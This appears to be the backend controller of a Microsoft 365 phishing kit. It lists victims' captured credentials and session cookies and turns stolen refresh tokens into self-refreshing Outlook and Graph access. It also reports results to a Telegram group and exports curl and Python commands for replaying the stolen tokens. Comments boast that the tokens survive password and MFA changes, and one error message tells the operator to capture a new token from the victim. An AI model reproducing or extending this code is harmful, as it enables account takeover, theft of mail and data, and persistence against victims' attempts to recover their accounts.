// controllers/tokenController.js
const axios = require('axios');
const { PersistentTokenManager } = require('../services/tokenManager');

class TokenController {
    constructor(capturedData, bot, telegramGroupId) {
        this.capturedData = capturedData;
        this.bot = bot;
        this.telegramGroupId = telegramGroupId;
    }

    getCapturedSessions(req, res) {
        const sessions = Array.from(this.capturedData.entries()).map(([id, sessionData]) => {
            const criticalCookies = (sessionData.cookies || []).filter(c => 
                c.includes('FedAuth') || 
                c.includes('x-ms-gateway-token') || 
                c.includes('ESTSAUTH') || 
                c.includes('ESTSAUTHPERSISTENT') || 
                c.includes('MSISAuth') || 
                c.includes('SignInStateCookie')
            );
            
            const hasOutlook = !!(sessionData.tokens?.outlook || sessionData.tokens?.access_token);
            const hasGraph = !!sessionData.tokens?.graph;
            
            return {
                id,
                username: sessionData.credentials?.username,
                hasPassword: !!sessionData.credentials?.password,
                cookieCount: sessionData.cookies?.length || 0,
                criticalCookies: criticalCookies.length,
                criticalCookieNames: criticalCookies.map(c => {
                    const match = c.match(/([^=]+)=/);
                    return match ? match[1] : 'unknown';
                }),
                hasOutlook,
                hasGraph,
                hasDualTokens: hasOutlook && hasGraph,
                tokenType: sessionData.tokens?.dual_capture ? 'Dual (Outlook+Graph) CAE-Enabled' : 
                           (sessionData.tokens?.is_desktop ? 'Desktop (90-day) CAE-Enabled' : 'Web (24-hour)'),
                victimInfo: sessionData.victimInfo || sessionData.credentials?.victimInfo,
                time: sessionData.credentials?.time || sessionData.time,
                cae_enabled: true
            };
        });
        
        res.json({ 
            total: this.capturedData.size, 
            sessions,
            note: 'CAE-enabled tokens survive password and MFA changes automatically'
        });
    }

    async getTokenStatus(req, res) {
        const sessionId = req.params.sessionId;
        const session = this.capturedData.get(sessionId);
        
        if (!session) {
            return res.status(404).json({ 
                error: 'Session not found',
                message: `No session found with ID: ${sessionId}`,
                availableSessions: Array.from(this.capturedData.keys()).slice(0, 10)
            });
        }
        
        if (!session.tokenManagers || Object.keys(session.tokenManagers).length === 0) {
            const hasRefreshToken = session.tokens?.outlook?.refresh_token || 
                                   session.tokens?.graph?.refresh_token || 
                                   session.tokens?.refresh_token;
            
            return res.json({
                sessionId,
                status: 'not_migrated',
                message: 'Session has not been migrated to persistent system',
                hasRefreshToken: !!hasRefreshToken,
                availableTokens: {
                    hasOutlook: !!session.tokens?.outlook,
                    hasGraph: !!session.tokens?.graph,
                    hasDesktop: !!session.tokens?.is_desktop
                },
                migrationEndpoint: `/api/migrate-token/${sessionId}`,
                note: 'Use the migration endpoint to convert this session to persistent tokens'
            });
        }
        
        const status = {};
        for (const [resource, tokenManager] of Object.entries(session.tokenManagers)) {
            status[resource] = tokenManager.getStatus();
            
            if (req.query.test === 'true') {
                const testResult = await tokenManager.testAccess();
                status[resource].testResult = testResult;
            }
        }
        
        res.json({
            sessionId,
            email: session.credentials?.username,
            tokenStatus: status,
            caeEnabled: true,
            note: "CAE-enabled tokens survive password and MFA changes automatically"
        });
    }

    exportPersistentTokens(req, res) {
        const sessionId = req.params.sessionId;
        const session = this.capturedData.get(sessionId);
        
        if (!session || !session.tokenManagers) {
            return res.status(404).json({ error: 'Session or tokens not found' });
        }
        
        const exportData = {};
        const refreshExamples = {};
        
        for (const [resource, tokenManager] of Object.entries(session.tokenManagers)) {
            exportData[resource] = {
                access_token: tokenManager.accessToken,
                refresh_token: tokenManager.refreshToken,
                expires_at: tokenManager.expiresAt,
                expires_in_seconds: Math.max(0, Math.floor((tokenManager.expiresAt - Date.now()) / 1000)),
                scopes: tokenManager.scopes,
                refresh_count: tokenManager.refreshCount,
                cae_enabled: tokenManager.caeEnabled
            };
            
            const clientId = resource === 'graph' ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
            refreshExamples[resource] = {
                curl: `curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "client_id=${clientId}" \\
  -d "refresh_token=${tokenManager.refreshToken}" \\
  -d "grant_type=refresh_token" \\
  -d "scope=${resource === 'graph' ? 'https://graph.microsoft.com/.default' : 'https://outlook.office.com/.default'} offline_access" \\
  -d "claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D"`,
                
                python: `import requests

response = requests.post(
    'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    data={
        'client_id': '${clientId}',
        'refresh_token': '${tokenManager.refreshToken}',
        'grant_type': 'refresh_token',
        'scope': '${resource === 'graph' ? 'https://graph.microsoft.com/.default' : 'https://outlook.office.com/.default'} offline_access',
        'claims': '{"access_token":{"xms_cc":{"values":["CP1"]}}}'
    }
)
print(response.json())`
            };
        }
        
        res.json({
            sessionId,
            email: session.credentials?.username,
            tokens: exportData,
            refresh_examples: refreshExamples,
            cae_status: "✅ Continuous Access Evaluation enabled - tokens will survive password and MFA changes",
            auto_refresh: "Tokens are automatically refreshed every 30 minutes before expiry"
        });
    }

    getPersistentSessions(req, res) {
        const persistentSessions = [];
        
        for (const [sessionId, sessionData] of this.capturedData.entries()) {
            if (sessionData.tokenManagers && Object.keys(sessionData.tokenManagers).length > 0) {
                const sessionInfo = {
                    sessionId,
                    email: sessionData.credentials?.username,
                    tokens: {}
                };
                
                for (const [resource, tokenManager] of Object.entries(sessionData.tokenManagers)) {
                    sessionInfo.tokens[resource] = {
                        valid: !tokenManager.isExpired(),
                        expiresIn: Math.max(0, Math.floor((tokenManager.expiresAt - Date.now()) / 1000)),
                        refreshCount: tokenManager.refreshCount,
                        caeEnabled: tokenManager.caeEnabled
                    };
                }
                
                persistentSessions.push(sessionInfo);
            }
        }
        
        res.json({
            total: persistentSessions.length,
            sessions: persistentSessions,
            note: "These sessions have CAE-enabled refresh tokens that survive password and MFA changes"
        });
    }

    async refreshSessionToken(req, res) {
        const sessionId = req.params.sessionId;
        const { resource = 'outlook' } = req.body;
        const session = this.capturedData.get(sessionId);
        
        if (!session || !session.tokenManagers?.[resource]) {
            return res.status(404).json({ error: 'Session or resource not found' });
        }
        
        const tokenManager = session.tokenManagers[resource];
        
        try {
            const newTokens = await tokenManager.refresh(resource === 'graph');
            
            if (resource === 'outlook' && session.tokens?.outlook) {
                session.tokens.outlook.access_token = tokenManager.accessToken;
                session.tokens.outlook.refresh_token = tokenManager.refreshToken;
            } else if (resource === 'graph' && session.tokens?.graph) {
                session.tokens.graph.access_token = tokenManager.accessToken;
                session.tokens.graph.refresh_token = tokenManager.refreshToken;
            }
            
            this.capturedData.set(sessionId, session);
            
            res.json({
                success: true,
                message: 'Token refreshed successfully',
                expiresIn: Math.floor((tokenManager.expiresAt - Date.now()) / 1000),
                expiresAt: new Date(tokenManager.expiresAt).toISOString(),
                refreshCount: tokenManager.refreshCount
            });
        } catch (error) {
            res.status(500).json({
                success: false,
                error: error.message,
                requiresReauth: error.message.includes('revoked')
            });
        }
    }

    async migrateToken(req, res) {
        const sessionId = req.params.sessionId;
        const { refreshToken, resource = 'outlook' } = req.body;
        
        if (!refreshToken) {
            return res.status(400).json({ 
                error: 'No refresh token provided',
                solution: 'You need to provide a valid refresh token'
            });
        }
        
        const session = this.capturedData.get(sessionId) || { credentials: {}, tokens: {}, cookies: [] };
        
        try {
            const testClaims = JSON.stringify({
                access_token: {
                    xms_cc: { values: ["CP1"] }
                }
            });
            
            const clientId = resource === 'graph' ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
            const scope = resource === 'graph' 
                ? 'https://graph.microsoft.com/.default offline_access'
                : 'https://outlook.office.com/.default offline_access';
            
            const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: clientId,
                    refresh_token: refreshToken,
                    grant_type: 'refresh_token',
                    scope: scope,
                    claims: testClaims
                }).toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: 15000
                }
            );
            
            const newTokens = testResponse.data;
            const tokenManager = new PersistentTokenManager(sessionId, newTokens, resource);
            
            if (!session.tokenManagers) session.tokenManagers = {};
            session.tokenManagers[resource] = tokenManager;
            
            if (resource === 'outlook') {
                if (!session.tokens) session.tokens = {};
                session.tokens.outlook = {
                    access_token: newTokens.access_token,
                    refresh_token: newTokens.refresh_token,
                    expires_in: newTokens.expires_in,
                    scope: newTokens.scope,
                    captured_at: new Date().toISOString(),
                    expires_at: tokenManager.expiresAt,
                    migrated: true
                };
            } else if (resource === 'graph') {
                if (!session.tokens) session.tokens = {};
                session.tokens.graph = {
                    access_token: newTokens.access_token,
                    refresh_token: newTokens.refresh_token,
                    expires_in: newTokens.expires_in,
                    scope: newTokens.scope,
                    captured_at: new Date().toISOString(),
                    expires_at: tokenManager.expiresAt,
                    migrated: true
                };
            }
            
            this.capturedData.set(sessionId, session);
            
            if (this.bot && this.telegramGroupId) {
                const message = `🔄 *Token Migrated Successfully*\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `*Session:* \`${sessionId}\`\n` +
                    `*Resource:* ${resource}\n` +
                    `*Expires:* ${new Date(tokenManager.expiresAt).toLocaleString()}\n` +
                    `*Status:* ✅ Token now survives password & MFA changes`;
                
                await this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' });
            }
            
            res.json({
                success: true,
                message: 'Token successfully migrated to persistent CAE system',
                tokenStatus: tokenManager.getStatus(),
                note: 'This token will now survive password and MFA changes'
            });
            
        } catch (error) {
            console.error('❌ Migration failed:', error.message);
            
            let errorType = 'unknown';
            let errorMessage = 'Migration failed';
            let solution = '';
            
            if (error.response?.status === 400) {
                const errorCode = error.response?.data?.error;
                switch (errorCode) {
                    case 'invalid_grant':
                        errorType = 'revoked_token';
                        errorMessage = '❌ Refresh token is invalid or revoked';
                        solution = `This token has been revoked. Common causes:\n• The user changed their password\n• The user signed out from "All Devices"\n• The token expired (refresh tokens last 90 days)\n• Admin revoked the session\n\n💡 Solution: Capture a new token from the victim.`;
                        break;
                    default:
                        errorMessage = `❌ Error: ${errorCode || 'unknown'}`;
                }
            }
            
            res.status(400).json({
                success: false,
                error: errorMessage,
                errorType: errorType,
                details: error.response?.data || error.message,
                solution: solution
            });
        }
    }

    async migrateAllTokens(req, res) {
        const axios = require('axios');
        const results = [];
        let migrated = 0;
        let failed = 0;
        
        for (const [sessionId, session] of this.capturedData.entries()) {
            let hasRefreshToken = false;
            let refreshToken = null;
            let resource = null;
            
            if (session.tokens?.outlook?.refresh_token) {
                refreshToken = session.tokens.outlook.refresh_token;
                resource = 'outlook';
                hasRefreshToken = true;
            } else if (session.tokens?.graph?.refresh_token) {
                refreshToken = session.tokens.graph.refresh_token;
                resource = 'graph';
                hasRefreshToken = true;
            } else if (session.tokens?.refresh_token) {
                refreshToken = session.tokens.refresh_token;
                resource = 'outlook';
                hasRefreshToken = true;
            }
            
            if (hasRefreshToken && refreshToken) {
                try {
                    const testClaims = JSON.stringify({
                        access_token: {
                            xms_cc: { values: ["CP1"] }
                        }
                    });
                    
                    const clientId = resource === 'graph' ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
                    const scope = resource === 'graph' 
                        ? 'https://graph.microsoft.com/.default offline_access'
                        : 'https://outlook.office.com/.default offline_access';
                    
                    const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: clientId,
                            refresh_token: refreshToken,
                            grant_type: 'refresh_token',
                            scope: scope,
                            claims: testClaims
                        }).toString(),
                        {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            },
                            timeout: 10000
                        }
                    );
                    
                    const newTokens = testResponse.data;
                    const tokenManager = new PersistentTokenManager(sessionId, newTokens, resource);
                    
                    if (!session.tokenManagers) session.tokenManagers = {};
                    session.tokenManagers[resource] = tokenManager;
                    
                    this.capturedData.set(sessionId, session);
                    migrated++;
                    results.push({ sessionId, resource, status: 'success' });
                    
                    console.log(`✅ Migrated token for session ${sessionId} (${resource})`);
                    
                } catch (error) {
                    failed++;
                    results.push({ 
                        sessionId, 
                        resource, 
                        status: 'failed', 
                        error: error.response?.data?.error || error.message 
                    });
                    console.log(`❌ Failed to migrate token for session ${sessionId}:`, error.message);
                }
            }
        }
        
        if (this.bot && this.telegramGroupId) {
            const summaryMessage = `🔄 *Token Migration Complete*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Total Sessions:* ${this.capturedData.size}\n` +
                `*Successfully Migrated:* ${migrated}\n` +
                `*Failed:* ${failed}\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Status:* ${migrated > 0 ? '✅ CAE-enabled tokens now survive password & MFA changes' : 'No valid refresh tokens found'}`;
            
            await this.bot.sendMessage(this.telegramGroupId, summaryMessage, { parse_mode: 'Markdown' });
        }
        
        res.json({
            success: true,
            total: this.capturedData.size,
            migrated,
            failed,
            results
        });
    }
}

module.exports = TokenController;